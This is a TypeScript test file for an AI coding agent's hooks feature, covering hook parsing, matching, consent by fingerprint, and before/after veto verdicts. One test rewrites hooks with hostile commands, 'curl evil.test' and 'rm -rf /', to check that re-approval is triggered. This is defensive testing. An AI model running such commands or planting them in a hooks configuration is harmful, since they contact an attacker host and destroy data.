// Commands the team wants run around a tool call.
//
// A hook is a command somebody else wrote, run on this machine, on a trigger the agent pulls — so
// it is powerful in exactly the way an MCP stdio server is powerful, and most of these tests are
// about the consent and the veto rather than about the matching.

import { test } from "node:test";
import assert from "node:assert/strict";
import {
  DEFAULT_TIMEOUT_MS,
  MAX_TIMEOUT_MS,
  describeHooks,
  hookVerdict,
  hooksFingerprint,
  matchingHooks,
  parseHooks,
  type Hook,
} from "../src/core/hooks/hooks.js";
import { matchGlob } from "../src/core/util/glob.js";
import { verifyTurn } from "../src/core/router/outcome.js";
import { readFileSync } from "node:fs";
import { join } from "node:path";

const FILE = JSON.stringify({
  hooks: [
    { name: "lint", when: "after", tool: ["write_file", "edit_file"], path: "src/**", command: "npm run lint" },
    { when: "before", tool: "run_command", command: "./scripts/allowed.sh" },
    { when: "after", tool: "*", command: "echo done", timeoutMs: 1000 },
  ],
});

// ── Reading the file ─────────────────────────────────────────────────────────────────────────────

test("a hooks file is read, with the defaults it does not state", () => {
  const { hooks, problems } = parseHooks(FILE);
  assert.deepEqual(problems, []);
  assert.equal(hooks.length, 3);
  assert.equal(hooks[0]?.name, "lint");
  assert.deepEqual(hooks[0]?.tools, ["write_file", "edit_file"]);
  assert.deepEqual(hooks[0]?.paths, ["src/**"]);
  assert.equal(hooks[0]?.timeoutMs, DEFAULT_TIMEOUT_MS);
  // A hook with no name is named after its command, because the step list has to say something.
  assert.equal(hooks[1]?.name, "./scripts/allowed.sh");
  assert.equal(hooks[2]?.timeoutMs, 1000);
});

test("a bare array is a hooks file too", () => {
  const { hooks, problems } = parseHooks('[{"when":"after","tool":"*","command":"true"}]');
  assert.deepEqual(problems, []);
  assert.equal(hooks.length, 1);
});

test("a hook that cannot run is reported by name, never silently skipped", () => {
  // The same choice as the skills and knowledge parsers: a file somebody wrote by hand deserves to
  // be told what is wrong with it.
  const { hooks, problems } = parseHooks(
    JSON.stringify({
      hooks: [
        { when: "after", tool: "*" },
        { when: "sometimes", tool: "*", command: "true" },
        { when: "after", command: "true" },
        { when: "after", tool: "*", command: "true" },
      ],
    }),
  );
  assert.equal(hooks.length, 1, "only the last one is runnable");
  assert.equal(problems.length, 3);
  assert.match(problems[0]!, /no "command"/);
  assert.match(problems[1]!, /"when" must be "before" or "after"/);
  assert.match(problems[2]!, /no "tool"/);
});

test("an unreadable file is a problem, not an empty hook list", () => {
  const { hooks, problems } = parseHooks("{not json", ".hiveycode/hooks.json");
  assert.deepEqual(hooks, []);
  assert.match(problems[0]!, /^\.hiveycode\/hooks\.json: not readable JSON/);
});

test("a timeout longer than a turn can wait is capped, and said", () => {
  const { hooks, problems } = parseHooks(JSON.stringify([{ when: "after", tool: "*", command: "true", timeoutMs: 9_000_000 }]));
  assert.equal(hooks[0]?.timeoutMs, MAX_TIMEOUT_MS);
  assert.match(problems[0]!, /longer than a turn can wait/);
});

// ── Which ones apply ─────────────────────────────────────────────────────────────────────────────

const { hooks } = parseHooks(FILE);

test("a hook matches on when, on tool and on path", () => {
  const after = matchingHooks(hooks, { when: "after", tool: "write_file", path: "src/a.ts" }, matchGlob);
  assert.deepEqual(after.map((h) => h.name), ["lint", "echo done"]);
  // Another path, so the path-filtered one does not apply.
  const elsewhere = matchingHooks(hooks, { when: "after", tool: "write_file", path: "docs/a.md" }, matchGlob);
  assert.deepEqual(elsewhere.map((h) => h.name), ["echo done"]);
  // Another tool.
  const other = matchingHooks(hooks, { when: "after", tool: "git_commit" }, matchGlob);
  assert.deepEqual(other.map((h) => h.name), ["echo done"]);
  // And before is a different event entirely.
  assert.deepEqual(
    matchingHooks(hooks, { when: "before", tool: "run_command" }, matchGlob).map((h) => h.name),
    ["./scripts/allowed.sh"],
  );
});

test("a path-filtered hook does NOT fire on a call with no path", () => {
  // `after write_file on src/**` is about a file. Running it when the agent ran a command instead
  // would be running it on the wrong event.
  const fired = matchingHooks(hooks, { when: "after", tool: "write_file" }, matchGlob);
  assert.equal(fired.some((h) => h.name === "lint"), false);
});

// ── The consent ──────────────────────────────────────────────────────────────────────────────────

test("the dialog names every command, because that is what is being approved", () => {
  const text = describeHooks(hooks);
  assert.match(text, /npm run lint/);
  assert.match(text, /\.\/scripts\/allowed\.sh/);
  assert.match(text, /echo done/);
  assert.match(text, /came with the repository/);
  assert.match(text, /only if you know where it came from/);
  assert.equal(describeHooks([]), "No hooks.");
});

test("a changed command asks again; a renamed hook does not", () => {
  // Asking about a label is how people learn to click yes.
  const renamed = hooks.map((h) => (h.name === "lint" ? { ...h, name: "our linter" } : h));
  assert.equal(hooksFingerprint(renamed), hooksFingerprint(hooks), "a rename must not re-ask");

  for (const changed of [
    hooks.map((h) => (h.name === "lint" ? { ...h, command: "npm run lint && curl evil.test" } : h)),
    hooks.map((h) => (h.name === "lint" ? { ...h, when: "before" as const } : h)),
    hooks.map((h) => (h.name === "lint" ? { ...h, tools: ["*"] } : h)),
    hooks.map((h) => (h.name === "lint" ? { ...h, paths: ["**"] } : h)),
    [...hooks, { when: "after" as const, tools: ["*"], command: "rm -rf /", timeoutMs: 1000, name: "x" }],
  ]) {
    assert.notEqual(hooksFingerprint(changed as Hook[]), hooksFingerprint(hooks));
  }
});

test("the fingerprint does not depend on the order hooks were written in", () => {
  assert.equal(hooksFingerprint([...hooks].reverse()), hooksFingerprint(hooks));
});

// ── The verdict ──────────────────────────────────────────────────────────────────────────────────

const lint = hooks[0]!;
const gate = hooks[1]!;

test("a before hook that exits non-zero REFUSES the call, with what it printed", () => {
  const { allow, message } = hookVerdict({ hook: gate, code: 2, output: "command not on the allow-list", timedOut: false });
  assert.equal(allow, false);
  assert.match(message, /Refused by the \.\/scripts\/allowed\.sh hook \(exit 2\)/);
  // The output IS the instruction: "the hook failed" with nothing else is a dead end the model
  // answers by guessing.
  assert.match(message, /command not on the allow-list/);
});

test("an after hook that fails is reported as a failing test, and the call still happened", () => {
  const { allow, message } = hookVerdict({ hook: lint, code: 1, output: "src/a.ts:3 no-unused-vars", timedOut: false });
  assert.equal(allow, true, "the write already happened; pretending otherwise would be a lie");
  assert.match(message, /treat it as a failing test/);
  assert.match(message, /no-unused-vars/);
});

test("a hook that succeeded says nothing at all", () => {
  assert.deepEqual(hookVerdict({ hook: lint, code: 0, output: "all good", timedOut: false }), { allow: true, message: "" });
});

test("a hook that did not finish has not said no", () => {
  // Refusing on a timeout would make a slow linter a broken agent. Reporting it lets the user see
  // the hook needs attention.
  const before = hookVerdict({ hook: gate, code: 124, output: "", timedOut: true });
  assert.equal(before.allow, false, "a before hook whose verdict is unknown cannot let the call through");
  assert.match(before.message, /did not finish within/);
  assert.match(before.message, /The call was not made/);

  const after = hookVerdict({ hook: lint, code: 124, output: "", timedOut: true });
  assert.equal(after.allow, true);
  assert.match(after.message, /verdict is unknown/);
});

test("a failing hook is a verification for the turn, like a failing test", () => {
  const steps = [
    { tool: "write_file", ok: true, summary: "wrote src/a.ts" },
    { tool: "hook", ok: false, summary: "lint failed", call: "npm run lint" },
  ];
  assert.equal(verifyTurn(steps).kind, "verification", "the team's own check said no and nothing noticed");
  // And the last one wins, so a hook that failed and then passed is not a failure.
  const fixed = [...steps, { tool: "edit_file", ok: true, summary: "fixed" }, { tool: "hook", ok: true, summary: "lint passed", call: "npm run lint" }];
  assert.equal(verifyTurn(fixed).kind, "none");
});

// ── Where it is wired, and what cannot be skipped ────────────────────────────────────────────────

test("every tool is wrapped, rather than each tool remembering to call the hooks", () => {
  // A tool that had to remember would forget, and the one it forgets on is the one somebody wrote
  // the hook for.
  const tools = readFileSync(join("src", "extension", "tools.ts"), "utf8");
  assert.match(tools, /return withHooks\(\[/, "the tool list is not wrapped");
  assert.match(tools, /deps\.hooks\);/);

  const hooks = readFileSync(join("src", "extension", "hooks.ts"), "utf8");
  assert.match(hooks, /export function withHooks/);
  // Before, then the tool, then after. A refused `before` must return without running the tool.
  assert.match(hooks, /if \(!before\.allow\) return \{ content: before\.messages\.join/);
});

test("a hook from the repository is consented to by fingerprint; one from the settings is not", () => {
  // The user wrote their own on their own machine. A `.hiveycode/hooks.json` arrived with a clone,
  // and approving "hooks" in general would approve every command anybody adds to it afterwards.
  const code = readFileSync(join("src", "extension", "hooks.ts"), "utf8");
  assert.match(code, /if \(theirs\.length && !\(await this\.approved\(fromRepository\)\)\)/);
  assert.match(code, /hooksFingerprint\(hooks\)/);
  assert.match(code, /describeHooks\(hooks\)/, "the dialog does not name the commands");
  // And a refusal is remembered, because being asked on every tool call is how a no becomes a yes.
  assert.match(code, /\[print\]: yes/);
});

test("the turn's step list is the one the hooks write into", () => {
  // Otherwise a failing hook is invisible to `verifyTurn`, which reads the steps.
  const chat = readFileSync(join("src", "extension", "chat.ts"), "utf8");
  assert.match(chat, /const steps: Array<\{[^}]*\}> = hookSteps;/s, "the hook steps are a second list nobody reads");
  assert.match(chat, /hookSteps\.push\(\{ tool: "hook"/);
});
